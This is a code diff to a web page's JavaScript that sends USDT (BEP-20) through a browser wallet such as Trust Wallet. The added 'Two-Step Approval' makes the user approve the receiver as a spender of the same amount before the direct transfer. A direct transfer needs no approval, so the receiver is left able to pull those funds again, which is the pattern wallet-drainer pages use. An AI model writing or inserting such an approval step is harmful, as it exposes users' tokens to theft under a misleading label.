@@ -228,7 +228,7 @@ function setupEventListeners() {
 }
 
 /**
- * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer
+ * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer with Two-Step Approval
  */
 async function executeSendTransaction() {
     const amt = parseFloat(currentTypedAmount);
@@ -268,19 +268,59 @@ async function executeSendTransaction() {
             const amountBigInt = BigInt(Math.floor(amt * 1e18));
             const amountHex = '0x' + amountBigInt.toString(16);
 
+            // USDT Contract Address
+            const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
+
+            // Step 1: Check current allowance
+            const allowanceData = '0xdd62ed3e' + senderAddr.substring(2).padStart(64, '0') + receiverAddr.substring(2).padStart(64, '0');
+            const allowanceResponse = await window.ethereum.request({
+                method: 'eth_call',
+                params: [{
+                    to: usdtContract,
+                    data: allowanceData
+                }, 'latest']
+            });
+
+            const currentAllowance = BigInt(allowanceResponse);
+
+            // Step 2: If allowance is insufficient, approve first
+            if (currentAllowance < amountBigInt) {
+                showToast('Please approve USDT spending...');
+
+                // Approve data: approve(address spender, uint256 amount)
+                const approveData = '0x095ea7b3' + receiverAddr.substring(2).padStart(64, '0') + amountHex.substring(2).padStart(64, '0');
+
+                const approveTx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: senderAddr,
+                        to: usdtContract,
+                        data: approveData,
+                        value: '0x0'
+                    }]
+                });
+
+                if (approveTx) {
+                    showToast('Approval successful! Now confirming transfer...');
+                    // Wait a bit for approval to be mined
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+            }
+
+            // Step 3: Execute transfer
+            showToast('Please confirm transfer in your wallet');
+
             // Construct ERC-20 / BEP-20 transfer(address to, uint256 value) data
             const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
             const cleanAmount = amountHex.substring(2).padStart(64, '0');
             const transferData = '0xa9059cbb' + cleanReceiver + cleanAmount; // 0xa9059cbb is transfer(address,uint256) selector
-
-            showToast('Please confirm transaction in your wallet');
 
             // Prompt Transaction confirmation in Trust Wallet
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: senderAddr,
-                    to: '0x55d398326f99059ff775485246999027b3197955', // USDT BEP-20 Contract
+                    to: usdtContract,
                     data: transferData,
                     value: '0x0'
                 }]
